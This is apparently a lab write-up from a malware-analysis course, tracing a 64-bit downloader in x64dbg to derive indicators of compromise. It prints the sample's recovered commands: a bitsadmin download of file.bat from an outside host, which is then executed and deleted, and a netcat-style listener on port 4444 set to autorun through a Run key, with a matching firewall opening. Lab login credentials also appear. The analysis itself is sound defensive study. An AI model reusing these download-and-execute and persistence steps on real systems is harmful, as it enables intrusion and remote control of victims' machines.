# Lab 13 - Debugging 64-bit Downloader using X64DBG

- [Lab 13 - Debugging 64-bit Downloader using X64DBG](#lab-13---debugging-64-bit-downloader-using-x64dbg)
  - [Scenario](#scenario)
  - [Tools](#tools)
  - [Task 1: General Sample Information](#task-1-general-sample-information)
  - [Task 2: Function calls and breakpoints](#task-2-function-calls-and-breakpoints)
  - [Task 3: Running the Downloader](#task-3-running-the-downloader)

---

## Scenario

You have been called by a client to examine a weird sample that was found on one of their developerâ€™s systems. The client thinks this sample could be hiding its true nature of activity.

<br/>

The goal of this lab is to understand how to both debug and reverse engineer a downloader which is widely used by different threat actors.

<br/>

After completing this lab, you will be able to use a disassembler, such as IDA Pro, to reverse engineer a downloader. You will also be able to use a debugger, such as x64dbg, to debug the same downloader and understand what malicious activity is being carried by this downloader.

<br/>

192.168.210.10 / AdminELS / Nu3pmkfyX

<br/>

---

## Tools

- x64dbg
- IDA Pro
- PEStudio

<br/>

---

## Task 1: General Sample Information

**Question**

Gather general information about the sample using only a debugger.

<br/>

**Answer**

First load (open) the sample into **x64dbg**.

Note:
Attach = Load a running process
Open = Load an Image

![picture 401](images/135d1ad6088f87c7459989a83febee672713929839c8bff014029a095c85b77d.png)  

<br/>

First check the **imported and exported APIs** by navigating to the **Symbols** tab:

![picture 402](images/3e3fa6612a4029f199372c4e5f6c6becd0a8dc9ad338ad5d7351489f44068967.png)  

<br/>

Double clicking `Downloader.exe` on the left will bring us to the disassembly:

![picture 403](images/f66dd2ce3ef50e54783b1a06d634b62f3bd6939aac457e6f006c35619d0ef897.png)  

<br/>

We can search for strings by `Right-click in the disassembly window > Search for > Current Module > String references`:

![picture 404](images/fb13582f3d510cc2c8d4c1bf01881a06aff3edef6483b92048fb90759470008a.png)  


![picture 405](images/d9e41bff31dd2dba435d478ce92f941fe58d5436f91a51c86cebc5f5783c072d.png)  

<br/>

Since the static analysis has been done before, it is skipped in this part. 

---

## Task 2: Function calls and breakpoints

**Question**

This is a malicious sample that was collected, and you need to Figure out what functions are being used and where to place a breakpoint to control the process.

<br/>

**Answer**

The main reason we use a debugger is to **have control of the execution flow** by adding breakpoints.

<br/>

By default, the debugger will stop at either:

- A system entry
- TLS callback
- The program's entrypoint

<br/>

In the **Symbol** tab, the program's entrypoint is highlighted in <red>red</red> (**Address of Entry Point**) - the red highlight mark means that there is a breakpoint at that address location.

![picture 406](images/400efc3b793b047ae386f6b3b02e8271364463b0bab8bc933853fbe447bb1a41.png)  

<br/>

Next, double-click `Downloader.exe` on the left to get back to the disassembly.

Then `right-click in the disassembly window > Search for > Current Module > Intermodular calls`.

![picture 407](images/b90d59d4499de27c41541819edbfab3b6b56cd11e660aae0dacc775ec9dd0c3b.png)  

![picture 408](images/003c95b206843b0388f14ce7259d759a57a999bd1d1f7dc5ac9d7e589b64a5f9.png)  

- New tab titled `Calls`
- Names of the modules are listed in parenthesis on the right
- The first 9 function calls (`ShellExecuteA`, `Sleep`, `URLDownloadToFileA`) are of interest

<br/>

Set breakpoints to the 9 function calls by `right-clicking the function > Toggle Breakpoint` one by one (or you can select the function calls then press `F2`):

![picture 409](images/10b0f0ca99db84593ab9a6b4e19f42a0dd65b8a75a2778654c56b85250c6980e.png)  

<br/>

After that you will see the related addresses highlighted in red:

![picture 410](images/496d0e3e52033270f08bf10f3b9aa876d975d9a83f67727855efc8180768f865.png)  

<br/>

We can also see the breakpoints we have set in the **Breakpoints tab**:

![picture 411](images/1f26c9d69bfadbb51a3fed83d5c5f3fcaa3bf906930d105a1faec8dfac0a428f.png)  

<br/>

After setting the breakpoints, run the program either by:

1. Click the Blue Arrow on the toolbar
2. Press `F9`

Then we should be brought to the **EntryPoint** in the **CPU tab**:

![picture 412](images/57c06660b94431351d380de680c8758ec9d9d2b64db85326c8843350efb35e6a.png)  

![picture 414](images/2898cc24bd96b4cdb43a01f77265ada9a66774bbd816728d32f1d0a5dc371cdb.png)  

- Note the status bar at the bottom shows `Paused`
- It also tells a **software breakpoint** `INT3` is reached at `0x7FF65A1A138C` - the downloader's entrypoint

<br/>

---

## Task 3: Running the Downloader

**Question**

Determine the IOCs that could be created to find and identify this sample on other systems.

<br/>

**Answer**

Continuing Task 2, click on the **Blue Arrow** once again, which brings us to the first function call `ShellExecuteA`:

![picture 415](images/f1f8fcec7959c221d34c1d5904b583fab4d5560fab0f08c9b56c039886c35d7c.png)  

<br/>

Scroll up a few lines to see the instructions before the breakpoint:

![picture 416](images/f3ec7dc40a593228c60e4b5875d51642c03dbfa67cac26a1ce7271352b62575b.png)  

![picture 417](images/ff93334bbe3a961a77f5769853a5588d0853a2cf6e1612af0756822dd355e387.png)  

- `rcx` holds the value `0`
- `rdx` holds the value `open`
- `r8` holds the value `cmd.exe`
- `r9` holds the value `/C bitsadmin.exe /transfer IND1 /.....`

<br/>

64-bit programs pass the first 4 parameters through registers with the rest using the stack. 

Therefore, the above 4 parameters that will be passed to `ShellExecuteA` function, and the last 2 parameters are being passed on the stack as shown in the 2 `mov` operations, were both pushed the value `0`.

<br/>

Now hit `F9` or the **Blue Arrow** again, the program will stop again at the `call Sleep` instruction.

<br/>

In fact, what have happened before this breakpoint are:

1. `ShellExecuteA` calls `cmd.exe` to run `bitsadmin.exe` to download the file **ShellRunas.zip** from Sysinternal website
2. Save the downloaded file to `C:\Windows\Temp\1.zip`

![picture 418](images/8876de1940f2a4c61e43fdb59a005cb15f6254cb3e561a33f8eceaf2865375ee.png)  

<br/>

Continuing the program flow, this time let's **step into** (`F7`) the `Sleep` function:

![picture 419](images/52332f7f99b6276c0f91313cb5e5fbf4a7f216e8a84a2a052238748e8e359eaa.png)  

- You can now step into each step to see what happen
- Or you can press `CTRL+F9` to **Step until return**, which brings us to the function `ShellExecuteA`

![picture 420](images/494e830bcc628664cef20a9096ea9d91402bcc52d5514bd8d767129076558892.png)  

<br/>

Again, examine the lines before the breakpoint and analyze what have happened:

![picture 421](images/bed4f38e76be1175db92738675bb051f0cafb8c3ce505cd20ee00b50f111ea1d.png)  

![picture 422](images/f86c718cbd0f758e50764435e282dc73eafbc4d607d187e89cbfa7839a4aa4fd.png)  


1. `rcx` holds the value `0` --> hwnd
2. `rdx` holds the value `open` --> lpOperation
3. `r8` holds the value `cmd.exe` --> lpFile
4. `r9` holds the value `/C tar.exe -xf C:\\Windows ....` --> lpParameters

- Theses parameters will be passed to `ShellExecuteA`
- The last 2 parameters are being passed on the stack are `rdi` `C:\\Windows\\Temp\\` (lpDirectory) and `rbx` `0` (nShowCmd), as shown in the two `mov` operations.

<br/>

Then, pressing `F9`, `ShellExecuteA` will do `tar.exe -xf C:\\Windows\\Temp\\1.zip` and `del /F C:\\Windows\\Temp\\1.zip`:

1. open `cmd.exe`
2. Extract the content of `1.zip`
3. Delete `1.zip`

<br/>

![picture 423](images/3ec70689f3b42e6308bbdeb1719a9e0137f594090a31c2eacc6bf57b00918ff2.png)  

<br/>

Remember the function `URLDownloadToFile` takes 4 parameters:

```
HRESULT URLDownloadToFile(
             LPUNKNOWN            pCaller,
             LPCTSTR              szURL,
             LPCTSTR              szFileName,
  _Reserved_ DWORD                dwReserved,
             LPBINDSTATUSCALLBACK lpfnCB
);
```

<br/>

![picture 424](images/7ab48a66347901f021e8f24631928cdfb4b3d6b4e3e01c94278081655c2decfc.png)  

- `rcx` holds `0` --> pCaller
- `rdx` holds `https://download.sysinternals.com/files/Autoruns.zip` --> szURL
- `r8` holds `2.zip` --> szFileName
- `r9` holds `0` --> dwReserved
- The last parameters is being passed on the stack, which holds `0` --> lpfnCB

<br/>

The following is what you will see after **Stepping into** the `URLDownloadToFileA` function:

![picture 425](images/5799927cabb45c7b17d6f1cace2c699f5f49a295cdcc4cc94dbd46785f7e602b.png)  

- After hitting **Run**, the function will download `Autoruns.zip` from sysinternals website
- Save it to `C:\Windows\Temp\2.zip`

<br/>

Pressing `Ctrl+F9` to run until return, it brings us to the next breakpoint at the `call Sleep` instruction.

![picture 426](images/459619038983eea31a8f2a1b1c8eece2be3f3d193bf0ed5c9f713e942cd9164b.png)  

![picture 427](images/cb20991b01cc38467017e9ed603514cd582e5d9dc773449f47e432c2e8e4a108.png)  

- `rcx` is set to `0x1388`, which is `5000` in decimal

<br/>

When we press `F9` again, the program will sleep for 5000 ms, and bring us to the next breakpoint at `ShellExecuteA` function call.

![picture 428](images/55d266befbc6b55282d9c7166b2fab00922072303b0f0172c606ab7105db4e05.png)  

![picture 429](images/c3b1def82f6ae89a774c3eb14ae72811456eafaf7e307415c52c7fbdfe8403d3.png)  

```
HINSTANCE ShellExecuteA(
  HWND   hwnd,
  LPCSTR lpOperation,
  LPCSTR lpFile,
  LPCSTR lpParameters,
  LPCSTR lpDirectory,
  INT    nShowCmd
);
```

![picture 430](images/e623fed7872dff2d87bf9ba69a38784736237e4b158290485d4e022e61fd9cd8.png)  


- `rcx` holds `0`  --> hwnd
- `rdx` holds `open`  --> lpOperation
- `r8` holds `cmd.exe` --> lpFile
- `r9` holds `/C tar.exe .....`  --> lpParameters

<br/>

![picture 431](images/ef7d07beb08771908fa926fed8d34d017f4666bd61973e26dcea10206e397b0f.png)  


- `rdi` holds `C:\\Windows\\Temp\\`, which is being passed on the stack --> lpDirectory
- `ebx` holds `0` --> nShowCmd

<br/>

Running the program (`F9`) again, we arrive another breakpoint `call ShellExecuteA`. Here are what have happened:

1. Open `cmd.exe`
2. Execute `tar.exe -xf C:\Windows\Temp\2.zip`
3. Delete `C:\Windows\Temp\2.zip`

<br/>

![picture 432](images/695ac549ca1a50190be059ddee1d323674bd31a9b235ba73c33a957bb42e53e0.png)  

1. `rcx` holds `NULL` --> hwnd
2. `rdx` holds `open` --> lpOperation
3. `r8` holds `cmd.exe` --> lpFile
4. `r9` holds `/C bitsadmin.exe /transfer IND2 /download /priority high http://www.elsmap.com/file.bat C:\\Windows\\Temp\\file.bat` --> lpParameters

<br/>

![picture 433](images/cbe1e9e97ad5fdbbb36ca968060a6a4863e4b9ef426ba9625dbf5a49f246c5e1.png)  

- The two `mov` operations indicates the last 2 parameters being passed on the stack
- `rdi` holds `C:\\Windows\\Temp\\` --> lpDirectory
- `ebx` holds `0` --> nShowCmd

<br/>

Running the program will:

1. Open `cmd.exe`
2. Execute the `bitsadmin` command the download `file.bat` from `www.elsmap.com`
3. Save it to `C:\Windows\Temp\file.bat`

<br/>

Press `F9` again and we will arrive at the next `Sleep` instruction:

![picture 434](images/75a0978d1741978b0f1a246ae050e290127305149dedb00e158a82e30e8b82b5.png)  

<br/>

Since the VM does not have internet access, we cannot examine `file.bat`. But if true, we will get the following in `C:\Windows\Temp`:

![picture 435](images/2bf2406b83ddec4b9ce9efc3c145b7b53ea4f71ea061247ea8fa98bb79a37c41.png)  

1. Download `Printer.exe`
2. Save to `C:\Windows\Printer.exe`
3. Add a registry key at `HKLM\...\CurrentVersion\Run` to autorun `Printer.exe -Ldp 4444 -e cmd.exe`
4. Add an allowed entry in Windows Firewall to allow inbound tcp/4444 traffic

<br/>

Next, manually add a file `C:\Windows\Temp\file.bat`:

![picture 436](images/b162a8e5d49ec3e9bbf382163544d947baabf94d1a436da0ae9aee363269f203.png)  

<br/>

Press `F9` in x64dbg, we arrive at `ShellExecuteA` function call breakpoint again:

![picture 437](images/4eb07e5d84b8011e832ffe62af925cc5adbad4773d786d489265a7b8bf6c2a65.png)  

<br/>

Summarize the actions after the `Sleep` function:

1. `rcx` holds `NULL` --> hwnd
2. `rdx` holds `open` --> lpOperation
3. `r8` holds `cmd.exe` --> `lpFile`
4. `r9` holds `/C C:\\Windows\\Temp\\file.bat && del /F C:\\Windows\\Temp\\file.bat` --> lpParameters
5. `ebx` holds `0` --> nShowCmd
6. `rdi` holds `C:\\Windows\\Temp\\` --> lpDirectory

<br/>

Running the program:

1. Open `cmd.exe`
2. Execute `C:\Windows\Temp\file.bat`
3. Delete `C:\Windows\Temp\file.bat`

![picture 438](images/5a850c6c1169a844bc20816958942883480f6a2dc91ebc2a41dabb18a04e7eba.png)  

<br/>

Now examine `C:\Windows\Temp`:

![picture 439](images/a5f0cf88885824eb139c3f2545dc0b3aee52176d889c94aa9f718c2daf45db23.png)  

<br/>

---